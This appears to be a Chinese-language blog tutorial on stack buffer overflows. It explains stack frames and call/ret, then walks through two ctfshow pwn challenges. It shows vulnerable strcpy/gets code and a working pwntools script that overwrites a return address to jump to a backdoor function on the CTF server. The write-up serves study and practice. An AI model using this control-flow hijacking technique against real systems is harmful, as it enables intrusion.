[{"title":"栈溢出原理及其应用","url":"/2025/04/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/","content":"·栈溢出的原理栈以及栈的结构栈（Stack）是程序运行时用于存储局部变量、函数调用信息（如返回地址）等数据的内存区域。栈溢出是指当程序向栈中写入数据时，超出了预先分配的栈空间，导致覆盖了栈上的其他数据。存储在栈上的东西主要包括：\n\n返回地址（Return Address）：函数调用时，返回地址会被压入栈中，用于在函数执行完毕后返回到调用者。如果返回地址被覆盖，攻击者可以控制程序跳转到任意地址。\n局部变量：函数中的局部变量通常存储在栈上，如果输入数据过长，可能会覆盖这些变量。\n前一个栈帧的指针：当一个函数被调用时，栈中会分配一块内存空间（称为栈帧），用于恢复调用者的栈帧。\n\n\n\n\n\n例如：\nvoid stack_function(char *input)&#123;      char stack[10];//局部变量（缓冲区）      strcpy(stack,input);//strcpy为危险函数，未检查输入字符串长度，容易导致栈溢出&#125;\n\n\n 因为在栈中，调用的局部变量stack指向的地址和返回地址是相邻的。如果stack溢出，多余的数据会覆盖返回地址。我们可以利用这一点特性，对程序注入攻击payload，达到劫持程序控制流的目的。\n具体做法我们可以通过ctfshow中的最基础的栈溢出的题目来体现：\nPWN35\n 打开虚拟机，ssh连接，拿到题目的shell\n\n 题目还给了一个二进制文件，拖到ida里面看看\n\n代码分析（偷懒一下就只分析关键的地方）：\nFILE *stream; // [esp+0h] [ebp-1Ch] //定义输出流指针  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);//读取文件/ctfshow_flag并存储到指针stream中  if ( !stream )  &#123;    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);    exit(0);  &#125;//如果flag文件是空的，那么结束程序  fgets(flag, 64, stream);//将flag文件中的内容存储到变量flag中  signal(11, (__sighandler_t)sigsegv_handler);//为信号 11（即 SIGSEGV）注册一个处理函数 sigsegv_handler，当程序发生段错误时，操作系统会调用 sigsegv_handler 函数，而不是终止程序。\n\n 发现程序有了编号为11的信号（即SIGSEGV信号，段错误）时，执行sigsegv_handler（）函数\n打开该函数，观察到执行之后能输出flag的值，这是我们想要得到的结果，即让程序发生段错误，这个过程就是利用了栈溢出，即局部变量超出了栈的限制\nvoid __noreturn sigsegv_handler()&#123;  fprintf(stderr, &quot;%s\\n&quot;, flag);//输出变量flag的值  fflush(stderr);  exit(1);&#125;\n\n在输出一堆无用的提示信息后，执行下列程序 \nif ( argc &lt;= 1 ) &#123;   puts(&quot;Try again!&quot;); &#125; else &#123;   ctfshow((char *)argv[1]);   printf(&quot;QaQ!FLAG IS NOT HERE! Here is your input : %s&quot;, argv[1]); &#125; return 0;\n\n这里顺便讲一下argc和argv变量：\n在C语言中，argc是main函数的第一个参数，表示命令行参数的数量，他总是至少为1，因为第一个命令行参数（argv[0]）是程序的名称，不能为空。argv是main函数的第二个参数，是一个字符串数组，存储了所有命令行参数。argv[0]是程序的名称，argv[0]到argv[argc-1]是用户传递的参数。\n则我们后面输入的参数就是argv[1]，只要有输入，argc就会大于1，执行ctfshow函数：\nchar *__cdecl ctfshow(char *src)&#123;  char dest[104]; // [esp+Ch] [ebp-6Ch] BYREF  return strcpy(dest, src);//将src字符串的值粘贴到数组dest中，但strcpy函数没有限制或检查长度的功能，所以这里是栈溢出的突破口，即 将argv[1]的值（传给*src的字符串）的长度超出104即可&#125;\n\n\n成功拿到flag。\n这个就是栈溢出最基本的应用，后面还有许多的情况。 \n后门函数栈溢出攻击的核心目标就是覆盖函数的返回地址，将其篡改为攻击者控制的恶意代码的地址（典型如后门函数），从而劫持程序执行流程。\n如果一个程序中存在后门函数，我们可以利用栈溢出原理，将后门函数的地址覆盖到堆栈中，从而达到让目标程序执行后门函数的目的。\n通过底层原理来解释为什么栈溢出能够覆盖到返回地址：\n1.堆栈结构与偏移量的来源在函数调用的过程中，栈帧依次会存储以下内容（32位的程序）：\n+------------------+| 函数参数         | &lt;--- 高地址+------------------+| 返回地址         | &lt;--- EIP寄存器跳转的目标地址+------------------+| 旧的EBP          | &lt;--- 当前函数的基址指针（保存调用者的EBP）+------------------+| 局部变量（数组） | &lt;--- 溢出起点（如char buffer[64]）+------------------+| ...              | &lt;--- 其他局部变量或填充+------------------+| 当前ESP位置      | &lt;--- 低地址（栈顶）\n\n 在函数的调用中，栈内存从高地址向低地址方向增长，即压栈过程中，栈顶指针ESP向低地址移动。\n而数据填充过程中，数据是从低地址往高地址方向填充的，因为数组buffer[0]~buffer[n]所在的地址是从低到高的。\n压栈方向与数据填充方向相反，所以通过栈溢出能够做到覆盖返回地址而不是继续填充栈帧！\n说完了可行性，那么如何知道怎么填充数据呢？填充多少呢？\n这时候我们就要引入一个概念：偏移量。\n偏移量就是指从局部数组的起始位置到函数的返回地址的字节距离，填充数据从buffer[0]开始，往高地址填充时能确保覆盖返回地址的字节距离。\n由上图可知，要确保覆盖返回地址，我们需要做的是构造 数组所占字节长度（数组名4字节+数组元素n字节）+ ebp（栈底）长度4字节+覆盖的信息（这个就直接覆盖了函数的返回地址，代替原返回数据返回给了函数），这样就做到了将攻击代码的地址返回给了函数。\n2.函数调用的底层逻辑上述描述引出了一个问题：为什么将后门地址覆盖到原函数的返回地址上就能跳转到后门函数？\n返回值的本质我们从最简单的原理引入来帮助我们理解这个问题。比如：\nint add(int a, int b) &#123;    return a + b; // 返回计算结果&#125;\n\n一个计算两个值相加的函数，调用add(3,5)之后，返回的值8会返回调用者。（比如在main()函数中调用add,8会返回给main函数供main函数使用）\n返回值的底层实现1.调用函数（call指令）; 示例代码：main 函数调用 funcmain:    mov eax, 10    push eax         ; 传递参数（假设为 cdecl 调用约定）    call func        ; 调用 func    add esp, 4       ; 清理栈（调用者清理参数）    ; 后续代码...func:    push ebp         ; 保存调用者的栈帧基址    mov ebp, esp     ; 设置当前栈帧基址    sub esp, 8       ; 分配局部变量空间    ; 函数逻辑...\n\ncall的底层逻辑行为\n1.将返回地址（即下一条指令add sep, 4 的地址）压入栈顶。\n2.跳转到目标函数func()的地址，更新EIP（存储CPU下一条要执行的指令的内存地址的寄存器）为func（）函数的入口。\n2.函数返回（ret指令）func:    ; ...函数逻辑    mov esp, ebp     ; 恢复栈指针（释放局部变量）    pop ebp          ; 恢复调用者的栈帧基址    ret              ; 返回到调用者\n\n 1.从栈顶弹出返回地址到EIP。\n2.跳转到该地址，继续执行调用者（即main主函数）的代码\n3.栈溢出在执行call指令后，ret指令前，栈溢出会导致原先在栈底的返回地址被覆盖成目标恶意代码的返回地址，该返回地址在ret指令后会被弹出到EIP，从而导致函数返回的地址不再是调用者，而是恶意代码。\n我们可以通过具体的题目来展示这一过程：\nPWN36题目直接告诉我们有一个后门函数，并提供了源文件，如图。\n \n用ida pro打开文件，如图，得到文件的源代码 \n主函数里只有一个比较重要的ctfshow()函数，因为上面都是在输出废话。 \n查看ctfshow()函数，一个36个元素的数组和一个gets()函数，由于gets()函数没有输入长度的限制，所以输入长度超过36是做得到的，典型的栈溢出。那么怎么找到flag呢？\n注意看有一个后门函数：get_flag()，打开查看\n\n代码解释：\nint get_flag()&#123;  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF //定义一个数组  FILE *stream; // [esp+4Ch] [ebp-Ch]//定义一个文件输入流指针  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);//以只读方式（&quot;r&quot;）将文件/ctfshow_flag输入进stream  if ( !stream )//如果文件为空  &#123;    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);//输出报错信息：找不到该文件    exit(0);//函数结束  &#125;  fgets(s, 64, stream);//文件输入流stream将读到的文件信息传递给数组s  return printf(s);//输出s信息（即flag）&#125;\n\n因为后门函数将元素个数定在64个，大于待攻击的函数的36个，所以不用担心get_flag()的堆栈会溢出（即不能正确执行get_flag()导致无法正常输出flag）\n因为对输入用于攻击的数据要有精确的控制，既要有一定量的字符填满缓冲区导致其溢出，又要有get_flag()函数的地址，构造出一个精确的数据，我们需要借助程序实现目标数据的生成，即所谓的payload。\n如何获取函数的地址？\n打开ubuntu虚拟机，用gdb调试打开文件pwn：\ngdb ./pwn 调用gdb打开pwn文件disass get_flag 将pwn文件中的get_flag()函数转化为汇编语言，以便于查看函数的地址\n\n如图，得到get_flag()地址为0x08048586 \n编辑\n从函数ctfshow()的定义数组那一行中，能计算出偏移量为0x28+0x4（包括s[]的起始地址ebp-0x28到结束地址ebp-0x4占总共0x24字节,旧ebp的字节大小0x4,返回地址0x4字节）\n由此构造payload:\n\nfrom pwn import * # 调用库pwntoolsp = remote(&quot;pwn.challenge.ctf.show&quot;,28224) # 远程连接题目地址offset = 0x28 + 0x4 # 构造偏移量用于填充栈从而利用栈溢出进行攻击backdoor_addr = 0x08048586 # 后门函数的地址payload = offset * b&#x27;a&#x27; + p32(backdoor_addr) # 构造payload,这个就是恶意数据 p32()是pwntools库中一个函数，作用是将一个32位的整数转换为小端序字符串\\x86\\x85\\x04\\x08，能被系统识别地址p.sendline(payload) # 发送payload到目标服务器p.interactive() # 提供交互，用于查找flag\n\n执行payload代码后得到flag \n \n 以上是栈溢出最基本的原理以及应用。\n","categories":["笔记"],"tags":["pwn","栈溢出","CTF"]}]